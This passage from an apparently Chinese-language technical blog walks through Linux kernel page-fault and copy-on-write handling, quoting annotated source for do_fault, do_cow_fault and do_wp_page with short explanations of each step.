</span></span><span class="line"><span class="cl">							 <span class="n">pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">else</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nf">do_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span>		<span class="c1">// 若为文件映射页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						<span class="n">flags</span><span class="p">,</span> <span class="n">entry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">do_swap_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span>	<span class="c1">// 页表项不为空，将页面swap进内存
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="n">pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">entry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">pte_protnone</span><span class="p">(</span><span class="n">entry</span><span class="p">))</span>	<span class="c1">// 页表项为保护页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nf">do_numa_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">entry</span><span class="p">,</span> <span class="n">pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">);</span>	<span class="c1">// NUMA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="n">ptl</span> <span class="o">=</span> <span class="nf">pte_lockptr</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pmd</span><span class="p">);</span>	<span class="c1">// 页表自旋锁，此时页面已经在内存中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">spin_lock</span><span class="p">(</span><span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="o">!</span><span class="nf">pte_same</span><span class="p">(</span><span class="o">*</span><span class="n">pte</span><span class="p">,</span> <span class="n">entry</span><span class="p">)))</span>	<span class="c1">// 并发检查
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">goto</span> <span class="n">unlock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">// page fault是由写操作引发
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pte_write</span><span class="p">(</span><span class="n">entry</span><span class="p">))</span>		<span class="c1">// 页不可写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">return</span> <span class="nf">do_wp_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span>	<span class="c1">// COW
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="n">pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">ptl</span><span class="p">,</span> <span class="n">entry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">entry</span> <span class="o">=</span> <span class="nf">pte_mkdirty</span><span class="p">(</span><span class="n">entry</span><span class="p">);</span>	<span class="c1">// 页可写，设置为脏页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">entry</span> <span class="o">=</span> <span class="nf">pte_mkyoung</span><span class="p">(</span><span class="n">entry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">ptep_set_access_flags</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pte</span><span class="p">,</span> <span class="n">entry</span><span class="p">,</span> <span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">update_mmu_cache</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pte</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * This is needed only for protection faults but the arch code
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * is not yet telling us if this is a protection fault or not.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * This still avoids useless tlb flushes for .text page faults
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * with threads.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">flush_tlb_fix_spurious_fault</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">unlock</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">pte</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h5 id="do_fault">do_fault</h5>
<p>因为这次主要关心 COW，所以我们选择从<code>do_fault</code>继续深入</p>
<ul>
<li>首先定位发生缺页异常的位置在文件的第几页（前面确认了页面是文件映射而来）</li>
<li>确认有在<code>vma-&gt;vmops</code>中定义缺页异常处理函数</li>
<li>若是读操作，调用<code>do_read_fault</code></li>
<li>若是写操作，判断页面是否是可共享的页面，如果不是说明页面是 Task 私有的，需要 COW，调用<code>do_cow_dault</code></li>
<li>若是写操作，且页面是共享的，调用<code>do_shared_fault</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_fault</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">pte_t</span> <span class="o">*</span><span class="n">page_table</span><span class="p">,</span> <span class="kt">pmd_t</span> <span class="o">*</span><span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">pte_t</span> <span class="n">orig_pte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">pgoff_t</span> <span class="n">pgoff</span> <span class="o">=</span> <span class="p">(((</span><span class="n">address</span> <span class="o">&amp;</span> <span class="n">PAGE_MASK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="o">-</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="n">PAGE_SHIFT</span><span class="p">)</span> <span class="o">+</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_pgoff</span><span class="p">;</span>	<span class="c1">// 发生page fault的地址在文件中的页面偏移量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap</span><span class="p">(</span><span class="n">page_table</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_ops</span><span class="o">-&gt;</span><span class="n">fault</span><span class="p">)</span>	<span class="c1">// 是否有定义处理缺页异常的函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="n">VM_FAULT_SIGBUS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">))</span>	<span class="c1">// 当前内存访问是读操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nf">do_read_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">pgoff</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				<span class="n">orig_pte</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="n">VM_SHARED</span><span class="p">))</span>	<span class="c1">// 当前内存访问是写操作，且是私有映射MAP_PRIVATE，那么需要COW
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nf">do_cow_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">pgoff</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span>	<span class="c1">// 创建一个新的页，将数据拷贝到新页中，设置新页的PTE（此时还未真正write）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="n">orig_pte</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">do_shared_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">pgoff</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">orig_pte</span><span class="p">);</span>	<span class="c1">// 当前内存访问是写操作，且是共享映射MAP_SHARED，不需要COW
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><h5 id="do_cow_fault">do_cow_fault</h5>
<p><code>do_cow_fault</code>的流程大致如下</p>
<ul>
<li>首先调用<code>alloc_page_vma</code>分配一个新的物理页面<code>new_page</code></li>
<li>检查是否 OOM</li>
<li>然后<code>__do_fault</code>从文件中读取数据到另一个页面<code>fault_page</code>，其本质上是调用<code>vma-&gt;vm_ops</code>上绑定的<code>fault</code>函数</li>
<li><code>copy_user_highpage</code>将<code>fault_page</code>的数据拷贝到<code>new_page</code>中，这个函数实际上是<code>memcpy</code>的 wrap</li>
<li><code>do_set_pte</code>为页面设置 pte，属性为可写、匿名页</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_cow_fault</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">pmd_t</span> <span class="o">*</span><span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">pgoff_t</span> <span class="n">pgoff</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">pte_t</span> <span class="n">orig_pte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">fault_page</span><span class="p">,</span> <span class="o">*</span><span class="n">new_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">mem_cgroup</span> <span class="o">*</span><span class="n">memcg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">spinlock_t</span> <span class="o">*</span><span class="n">ptl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">pte_t</span> <span class="o">*</span><span class="n">pte</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">anon_vma_prepare</span><span class="p">(</span><span class="n">vma</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">VM_FAULT_OOM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">new_page</span> <span class="o">=</span> <span class="nf">alloc_page_vma</span><span class="p">(</span><span class="n">GFP_HIGHUSER_MOVABLE</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>	<span class="c1">// 为新页分配物理内存。VMA的表示粒度是4k
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new_page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">VM_FAULT_OOM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">mem_cgroup_try_charge</span><span class="p">(</span><span class="n">new_page</span><span class="p">,</span> <span class="n">mm</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">memcg</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 检查当前进程使用的内存是否超过了cgroup的限制
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">new_page</span><span class="p">);</span>	<span class="c1">// 释放COW的新页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="n">VM_FAULT_OOM</span><span class="p">;</span>	<span class="c1">// 返回OOM错误，COW失败
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">__do_fault</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pgoff</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">new_page</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fault_page</span><span class="p">);</span>	<span class="c1">// 从文件中读取数据到fault_page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_FAULT_ERROR</span> <span class="o">|</span> <span class="n">VM_FAULT_NOPAGE</span> <span class="o">|</span> <span class="n">VM_FAULT_RETRY</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">uncharge_out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">fault_page</span><span class="p">)</span>	<span class="c1">// 读取成功
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">copy_user_highpage</span><span class="p">(</span><span class="n">new_page</span><span class="p">,</span> <span class="n">fault_page</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">vma</span><span class="p">);</span>	<span class="c1">// 将fault_page的数据拷贝到new_page中，实际调用memcpy
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">__SetPageUptodate</span><span class="p">(</span><span class="n">new_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">pte</span> <span class="o">=</span> <span class="nf">pte_offset_map_lock</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="o">!</span><span class="nf">pte_same</span><span class="p">(</span><span class="o">*</span><span class="n">pte</span><span class="p">,</span> <span class="n">orig_pte</span><span class="p">)))</span> <span class="p">{</span>	<span class="c1">// 并发检查
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">pte</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">fault_page</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">unlock_page</span><span class="p">(</span><span class="n">fault_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">fault_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * The fault handler has no page to lock, so it holds
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * i_mmap_lock for read to protect against truncate.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="nf">i_mmap_unlock_read</span><span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_file</span><span class="o">-&gt;</span><span class="n">f_mapping</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">uncharge_out</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">do_set_pte</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">new_page</span><span class="p">,</span> <span class="n">pte</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>	<span class="c1">// 设置新页的PTE，该页为可写匿名页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">mem_cgroup_commit_charge</span><span class="p">(</span><span class="n">new_page</span><span class="p">,</span> <span class="n">memcg</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">lru_cache_add_active_or_unevictable</span><span class="p">(</span><span class="n">new_page</span><span class="p">,</span> <span class="n">vma</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">pte</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">fault_page</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">unlock_page</span><span class="p">(</span><span class="n">fault_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">fault_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * The fault handler has no page to lock, so it holds
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * i_mmap_lock for read to protect against truncate.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="nf">i_mmap_unlock_read</span><span class="p">(</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_file</span><span class="o">-&gt;</span><span class="n">f_mapping</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">uncharge_out</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="nf">mem_cgroup_cancel_charge</span><span class="p">(</span><span class="n">new_page</span><span class="p">,</span> <span class="n">memcg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">new_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h5 id="do_wp_page">do_wp_page</h5>
<p>第一次缺页时我们已经靠<code>do_fault</code>里的<code>do_cow_fault</code>把文件内容读进内存并设好了 pte，现在是由于没有写权限导致的第二次缺页，这次在<code>handle_pte_fault</code>调用的<code>do_wp_page</code>流程如下</p>
<ul>
<li>首先获取 pte 对应的页面</li>
<li>然后 COW 的流程会走到<code>reuse_swap_page</code>，判断是否只有一个 Task 在使用该页面</li>
<li>如果是就直接复用<code>do_cow_fault</code>分配的新页面，<code>wp_page_copy</code>拷贝页面内容，至此完成 COW</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_wp_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">pte_t</span> <span class="o">*</span><span class="n">page_table</span><span class="p">,</span> <span class="kt">pmd_t</span> <span class="o">*</span><span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="kt">spinlock_t</span> <span class="o">*</span><span class="n">ptl</span><span class="p">,</span> <span class="kt">pte_t</span> <span class="n">orig_pte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nf">__releases</span><span class="p">(</span><span class="n">ptl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">old_page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">old_page</span> <span class="o">=</span> <span class="nf">vm_normal_page</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">orig_pte</span><span class="p">);</span>	<span class="c1">// 获取pte对应的页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">old_page</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * VM_PFNMAP VMA.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 *
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * We should not cow pages in a shared writeable mapping.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">((</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_WRITE</span><span class="o">|</span><span class="n">VM_SHARED</span><span class="p">))</span> <span class="o">==</span>
</span></span><span class="line"><span class="cl">				     <span class="p">(</span><span class="n">VM_WRITE</span><span class="o">|</span><span class="n">VM_SHARED</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nf">wp_pfn_shared</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">page_table</span><span class="p">,</span> <span class="n">ptl</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">					     <span class="n">orig_pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">page_table</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">wp_page_copy</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">page_table</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				    <span class="n">orig_pte</span><span class="p">,</span> <span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * Take out anonymous pages first, anonymous shared vmas are
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * not dirty accountable.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">PageAnon</span><span class="p">(</span><span class="n">old_page</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">PageKsm</span><span class="p">(</span><span class="n">old_page</span><span class="p">))</span> <span class="p">{</span>		<span class="c1">// 处理匿名页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">trylock_page</span><span class="p">(</span><span class="n">old_page</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 尝试获取页面锁
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">page_cache_get</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">page_table</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">lock_page</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="n">page_table</span> <span class="o">=</span> <span class="nf">pte_offset_map_lock</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">							 <span class="o">&amp;</span><span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pte_same</span><span class="p">(</span><span class="o">*</span><span class="n">page_table</span><span class="p">,</span> <span class="n">orig_pte</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nf">unlock_page</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">page_table</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="nf">page_cache_release</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
